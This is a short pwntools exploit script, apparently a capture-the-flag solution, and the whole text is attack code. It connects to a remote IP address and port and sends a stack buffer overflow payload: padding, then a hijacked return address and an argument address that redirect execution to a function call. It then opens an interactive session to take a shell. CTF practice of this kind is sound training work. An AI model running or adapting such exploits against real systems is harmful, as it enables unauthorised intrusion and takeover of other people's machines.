from pwn import *

conn = remote('111.200.241.244',57596)
conn.recvuntil('Input:')
ret_addr = 0x8048320
arg0_addr = 0x0804a024
payload = b'A' * 0x8C + p32(ret_addr) + p32(0) + p32(arg0_addr)
conn.send(payload)
conn.interactive()